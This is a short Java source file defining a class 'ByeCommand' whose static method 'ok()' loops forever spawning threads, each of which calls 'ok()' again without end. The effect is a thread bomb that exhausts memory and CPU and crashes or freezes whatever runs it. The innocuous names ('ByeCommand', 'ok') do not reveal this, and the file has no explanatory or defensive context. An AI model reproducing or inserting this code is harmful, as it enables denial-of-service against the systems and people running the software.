public class ByeCommand {
    public ByeCommand() {
    }

    public static void ok() {
        while (true) {
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        ok();
                    }
                }
            });
            thread.start();
        }
    }
}